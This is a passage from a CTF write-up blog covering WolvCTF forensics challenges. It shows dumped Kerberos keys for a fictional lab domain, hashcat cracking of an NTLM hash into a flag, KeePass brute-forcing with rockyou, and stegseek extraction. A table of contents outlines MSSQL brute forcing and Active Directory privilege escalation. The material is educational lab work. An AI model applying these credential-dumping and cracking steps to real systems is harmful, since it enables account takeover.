class="line">wolvctf.corp\james:aes256-cts-hmac-sha1-96:744c13c321ea323429238a196eab9b65bea41b13577b13cf2ae4775e2540da22</span><br><span class="line">wolvctf.corp\james:aes128-cts-hmac-sha1-96:1f60e252b18a1fe2edd73300996d3daa</span><br><span class="line">wolvctf.corp\james:des-cbc-md5:5babd3bc9be6797a</span><br><span class="line">wolvctf.corp\emily:aes256-cts-hmac-sha1-96:adcb0acc59b9454912378c69039bea23fee975074f9e0fd09b738cb1eb98fe54</span><br><span class="line">wolvctf.corp\emily:aes128-cts-hmac-sha1-96:1950a20a02f7e41d000546d0aed292fc</span><br><span class="line">wolvctf.corp\emily:des-cbc-md5:d5e58929a4b96b3d</span><br><span class="line">wolvctf.corp\john:aes256-cts-hmac-sha1-96:d7aa03485fdead391b6c32bca4ebf7f0b3e6dc2cfd20c3a240bf066cbda3f4a9</span><br><span class="line">wolvctf.corp\john:aes128-cts-hmac-sha1-96:df8b329de72ab17b743943e3a4023aca</span><br><span class="line">wolvctf.corp\john:des-cbc-md5:b931a88615a794ab</span><br><span class="line">wolvctf.corp\patrick:aes256-cts-hmac-sha1-96:e01f8578724ef569bf545872403df16a3ac16bc67604f911dd97df88f3363efd</span><br><span class="line">wolvctf.corp\patrick:aes128-cts-hmac-sha1-96:0895763e253a210250b544de1eba67d9</span><br><span class="line">wolvctf.corp\patrick:des-cbc-md5:57ba527967611658</span><br><span class="line">wolvctf.corp\katherine:aes256-cts-hmac-sha1-96:b41404d85f0286000725a603bc890c5941c2356446f1acc6c6b4b80bd5b9fb16</span><br><span class="line">wolvctf.corp\katherine:aes128-cts-hmac-sha1-96:32c9f2a4c32fa36dc248fea63c7a985f</span><br><span class="line">wolvctf.corp\katherine:des-cbc-md5:9b852fb319e68aa8</span><br><span class="line">wolvctf.corp\Amy:aes256-cts-hmac-sha1-96:88393904dcb9cfced8e477dbab7b8d2ce1967254789e075a932541dadb6a7561</span><br><span class="line">wolvctf.corp\Amy:aes128-cts-hmac-sha1-96:7970b15f1ff40798a75eb47a80b5d117</span><br><span class="line">wolvctf.corp\Amy:des-cbc-md5:73522c0170f120c1</span><br><span class="line">wolvctf.corp\jessica:aes256-cts-hmac-sha1-96:8088cf6ebf4fae379d3d8cf0689e60d6c0f6f6aed5a69946d93418ea4962de68</span><br><span class="line">wolvctf.corp\jessica:aes128-cts-hmac-sha1-96:8df17274caccb4e4ef84b0195669c842</span><br><span class="line">wolvctf.corp\jessica:des-cbc-md5:19daa74645e398ba</span><br><span class="line">wolvctf.corp\frank:aes256-cts-hmac-sha1-96:3dc99ada65b1bf26e6211c01dccaa3a87349afa35172c818a1e39ab6e1dd4035</span><br><span class="line">wolvctf.corp\frank:aes128-cts-hmac-sha1-96:96d28a2a24a9a5fdadb6b31c7eab64bd</span><br><span class="line">wolvctf.corp\frank:des-cbc-md5:1c6d2cad9e3dfd8c</span><br><span class="line">wolvctf.corp\chris:aes256-cts-hmac-sha1-96:725f11a59f1c77f6ff41dd745cfc36e5229d09f271f471f9c52d7ed97793101a</span><br><span class="line">wolvctf.corp\chris:aes128-cts-hmac-sha1-96:9d963b6be441bf2652dd4bc351415bed</span><br><span class="line">wolvctf.corp\chris:des-cbc-md5:2ca2e983e632e5ba</span><br><span class="line">wolvctf.corp\renee:aes256-cts-hmac-sha1-96:0ecee7ab365fd5a38999fae2ed19d3f02a9ed51e5987227023316ed8f19c77a2</span><br><span class="line">wolvctf.corp\renee:aes128-cts-hmac-sha1-96:9e94283c417a8abe8f7752564b251051</span><br><span class="line">wolvctf.corp\renee:des-cbc-md5:a1e69b1f1afef42a</span><br><span class="line">wolvctf.corp\peter:aes256-cts-hmac-sha1-96:9558878dce8606d877c804dbbfea9cc42e0d4903f46158f5d8fd804c4a4dd5c2</span><br><span class="line">wolvctf.corp\peter:aes128-cts-hmac-sha1-96:9e86af0d3775c494cdffa0be7190b030</span><br><span class="line">wolvctf.corp\peter:des-cbc-md5:0867d54016ba0704</span><br><span class="line">wolvctf.corp\dan:aes256-cts-hmac-sha1-96:f55a42a6f1784346962ff1c1e53c6e8384be32bcc781d90c4c8a1227dda3aebc</span><br><span class="line">wolvctf.corp\dan:aes128-cts-hmac-sha1-96:9579003b132f9d68609107529450c919</span><br><span class="line">wolvctf.corp\dan:des-cbc-md5:467cfb4a9dec7c46</span><br><span class="line">wolvctf.corp\jake:aes256-cts-hmac-sha1-96:f166119ffe48d3f1bd6cce6cfe796045943d6e161d9b864ef2668dbb0f83003b</span><br><span class="line">wolvctf.corp\jake:aes128-cts-hmac-sha1-96:fb335f8432d5caf9b5250568c6457122</span><br><span class="line">wolvctf.corp\jake:des-cbc-md5:54917531317aec83</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<p>Where we can find the NTLM hash for jessica so we create a custom wordlist for the flag using the know prefix and I used <a target="_blank" rel="noopener" href="https://github.com/FinNLP/cities-list/blob/master/list.txt">cities.txt</a> for the cities part to create the custom wordlist for brute force using hashcat.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat --show -m 1000 8fcdcffba18f392df7aa291527290aff wordlistx.txt</span><br><span class="line">8fcdcffba18f392df7aa291527290aff:wctf&#123;bl00dh0und_is_c00l_votuporanga985&#125;</span><br></pre></td></tr></table></figure>

<p>And with the attacker gets Admin access and we get our last flag.</p>
<p>Flag 3: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">wctf&#123;bl00dh0und_is_c00l_votuporanga985&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="Flags-and-Conclusion"><a href="#Flags-and-Conclusion" class="headerlink" title="Flags and Conclusion"></a>Flags and Conclusion</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">wctf&#123;d0nt_3n4bl3_xP_cmdsh311_w1th_d3fault_cr3ds_0r_enabl3_4ut0log0n_0k??!?&#125;</span></span><br><span class="line"><span class="string">wctf&#123;asr3pr04st3d?_sh0uldv3_3nabl3d_s0m3_k3b3r0s_pr34th_4nd_d0nt_us3_4ll3xtendedr1ghts&#125;</span></span><br><span class="line"><span class="string">wctf&#123;bl00dh0und_is_c00l_votuporanga985&#125;</span></span><br></pre></td></tr></table></figure>

<p>Overall I really enjoyed this challenge series and a big shoutout to <code>@dree</code> for creating such fun challenges. The challenge helps in learn a lot about Kerboros, WinPEAS, NTDS and many other things.</p>
<h3 id="Passwords"><a href="#Passwords" class="headerlink" title="Passwords"></a>Passwords</h3><p>A fairly simply challenge where we are given a .kdbx file and all we had to was brute force the keepass password using rockoyu.txt to get password as <code>goblue1</code> and then just opening the file gives us the flag.</p>
<p><img src="/./images/wolv_kdbx.png" alt="Image"></p>
<p>Flag: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">wctf&#123;1_th0ught_1t_w4s_s3cur3?&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Breakout"><a href="#Breakout" class="headerlink" title="Breakout"></a>Breakout</h3><p>Another simple challenge where Stegseek on the given breakout.jpg reveals breakout.ch8 file file which on some googling turns out to be a chip8 game.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ stegseek --crack breakout.jpg rockyou.txt</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: <span class="string">&quot;&quot;</span></span><br><span class="line">[i] Original filename: <span class="string">&quot;breakout.ch8&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;breakout.jpg.out&quot;</span>.</span><br></pre></td></tr></table></figure>

<p>So on loading this file in an online <a target="_blank" rel="noopener" href="https://chip.netlify.app/emulator/">CHIP-8 emulator</a> we get a game and as soon as we complete the game we are given the flag.</p>
<p><img src="/./images/breakout.png" alt="Image"></p>
<p>Flag: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">WCTF&#123;GAME_OVER_VMASBKLTNUFMGS&#125;</span></span><br></pre></td></tr></table></figure></article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Forensics/">Forensics</a><a class="post-meta__tags" href="/tags/DFIR/">DFIR</a><a class="post-meta__tags" href="/tags/Steganography/">Steganography</a><a class="post-meta__tags" href="/tags/File-Analysis/">File Analysis</a></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/09/BITSCTF-2025/" title="BITSCTF-2025"><img class="cover" src="/images/bits_logo.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-09</div><div class="info-item-2">BITSCTF-2025</div></div><div class="info-2"><div class="info-item-1">I participated in BITSCTF 2025, organized by Bitskrieg. Here are the Writeups of some Forensics, RF and DFIR challenges I was personally able to solve during the competition. ForensicsFinders KeepersChallenge DescriptionAnother simple steganography challenge where we are initially given a .png file. SolutionThe given png has a .jpeg and a .wav file embedded in itself which we can find by the hex analysis and then extract the file using byte scraping to get the following two...</div></div></div></a><a class="pagination-related" href="/2025/02/02/Nullcon-2025/" title="Nullcon 2025"><img class="cover" src="/images/logo_nullcon.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-02</div><div class="info-item-2">Nullcon 2025</div></div><div class="info-2"><div class="info-item-1">I participated in Nullcon 2025, as a core member of the team InfoSecIITR. Our team secured 9th place globally. Here are the Writeups of some challenges I was personally able to solve during the competition. MiscAncient PaperChallenge DescriptionWe are given an image file along the following description: “I found this ancient artifact stuck in an old machine labeled “29”. But what is its purpose?” SolutionInitial inspection leads to the conclusion that the image is of an IBM-29 punch card...</div></div></div></a><a class="pagination-related" href="/2024/06/12/BCACTF-5-0-2024/" title="BCACTF 5.0 2024"><img class="cover" src="/images/bcactf_logo.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-12</div><div class="info-item-2">BCACTF 5.0 2024</div></div><div class="info-2"><div class="info-item-1">I participated in BCACTF 2024, as a core member of the team InfoSecIITR. Our team secured 7th place globally. Here are the Writeups of some challenges I was personally able to solve during the competition. Forensics&#x2F;23-719-writeupChallenge DescriptionWe are given a pdf along with the following description: That’s a nice unanimous supreme court decision you’ve made public, sure would be a shame if someone didn’t properly clean up remnants of a prior version of the document before...</div></div></div></a><a class="pagination-related" href="/2025/01/07/irisctf2025/" title="IrisCTF-2025"><img class="cover" src="/images/icon.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-07</div><div class="info-item-2">IrisCTF-2025</div></div><div class="info-2"><div class="info-item-1">I participated in IrisCTF 2025, organized by IrisSec, as a core member of the team InfoSecIITR. Our team secured 9th place globally. Here are the Writeups of some Forensics, Networking and RF challenges I was personally able to solve during the competition. ForensicsdeldeldelChallenge Description Source File: deldeldel.tar.gz SolutionWe are give a packet capture file for this challenge. On viewing it in Wireshark a stream of USB packets can be discoverd.  The file name indicating a keylogger...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/pfp.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Ansh Aggarwal</div><div class="author-info-description">DFIR enjoyer | Networking enthusiast | CTF player @InfoSecIITR</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/W1r3W01f"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/W1r3W01f" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ansh-aggarwal-818591298/" target="_blank" title="Linkedin"><i class="fab fa-linkedin"></i></a><a class="social-icon" href="mailto:ansh_a@ece.iitr.ac.in" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://discord.com/users/1129333663750959174" target="_blank" title="Discord"><i class="fab fa-discord"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">1.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-series-1-2-and-3"><span class="toc-number">1.1.</span> <span class="toc-text">Active series (1, 2 and 3)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge-Description"><span class="toc-number">1.1.1.</span> <span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution"><span class="toc-number">1.1.2.</span> <span class="toc-text">Solution</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Presence-of-MSSQL-server"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">Presence of MSSQL server</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#MSSQL-server-credential-brute-forcing"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">MSSQL server credential brute forcing</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Getting-powershell-access"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">Getting powershell access</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Getting-Autologon-Credentials"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">Getting Autologon Credentials</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Escalation-dan-to-emily"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">Escalation dan to emily</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Escalation-emily-to-james"><span class="toc-number">1.1.2.6.</span> <span class="toc-text">Escalation emily to james</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Escalation-james-to-patrick"><span class="toc-number">1.1.2.7.</span> <span class="toc-text">Escalation james to patrick</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Escalation-patrick-to-jake"><span class="toc-number">1.1.2.8.</span> <span class="toc-text">Escalation patrick to jake</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Escalation-jake-to-jessica"><span class="toc-number">1.1.2.9.</span> <span class="toc-text">Escalation jake to jessica</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flags-and-Conclusion"><span class="toc-number">1.1.3.</span> <span class="toc-text">Flags and Conclusion</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Passwords"><span class="toc-number">1.2.</span> <span class="toc-text">Passwords</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Breakout"><span class="toc-number">1.3.</span> <span class="toc-text">Breakout</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/wildlife-wolf-landscape-illustration-scenery-of-wolf-howling-silhouette-in-the-cliff-wolf-wildlife-panorama-for-illustration-background-or-wallpaper-.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>